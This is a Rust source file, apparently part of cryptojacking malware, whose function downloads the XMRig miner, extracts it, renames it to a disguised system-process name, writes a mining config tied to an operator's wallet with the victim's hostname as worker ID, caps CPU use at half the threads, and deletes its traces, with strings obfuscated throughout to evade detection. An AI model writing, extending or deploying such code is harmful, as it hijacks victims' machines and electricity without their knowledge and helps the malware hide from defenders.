use std::fs::{self, File};
use std::io::Write;
use std::path::Path;
use obfstr::obfstr;
use crate::common::constants::{get_download_url, get_pool_url, get_wallet, get_miner_exe_name, CONFIG_FILENAME};
use crate::utils::files::{download_file, extract_zip, move_files_from_subdir};
use crate::modules::miner::config::MinerConfig;

pub fn prepare_miner(staging_dir: &Path) -> Result<(), Box<dyn std::error::Error>> {
    // Download XMRig
    let zip_path = staging_dir.join(obfstr!("package.zip"));
    download_file(&get_download_url(), &zip_path)?;

    // Extract
    extract_zip(&zip_path, &staging_dir)?;
    move_files_from_subdir(&staging_dir)?;

    // Rename XMRig to SysSvchost
    let old_xmrig = staging_dir.join(obfstr!("xmrig.exe"));
    let new_miner = staging_dir.join(get_miner_exe_name());
    if old_xmrig.exists() {
        fs::rename(old_xmrig, &new_miner)?;
    } else {
        // If it's already renamed or missing?
        if !new_miner.exists() {
             return Err(obfstr!("Miner executable not found after extraction").into());
        }
    }

    // Create Config
    let total_threads = num_cpus::get() as i32;
    let mining_threads = std::cmp::max(1, total_threads / 2);
    
    // Generate Dynamic Worker ID: Hostname-Random7
    let host = hostname::get()
        .map(|h| h.to_string_lossy().into_owned())
        .unwrap_or_else(|_| "UNKNOWN".to_string());
        
    use rand::{Rng, distributions::Alphanumeric};
    let random_suffix: String = rand::thread_rng()
        .sample_iter(&Alphanumeric)
        .take(7)
        .map(char::from)
        .collect::<String>()
        .to_uppercase();
        
    let final_wallet = format!("{}.{}-{}", get_wallet(), host, random_suffix);
    
    let config_path = staging_dir.join(CONFIG_FILENAME);
    let config = MinerConfig::new(&get_pool_url(), &final_wallet, mining_threads);
    let json = serde_json::to_string_pretty(&config)?;
    let mut file = File::create(&config_path)?;
    file.write_all(json.as_bytes())?;

    // Clean up zip
    let _ = fs::remove_file(&zip_path);
    
    Ok(())
}
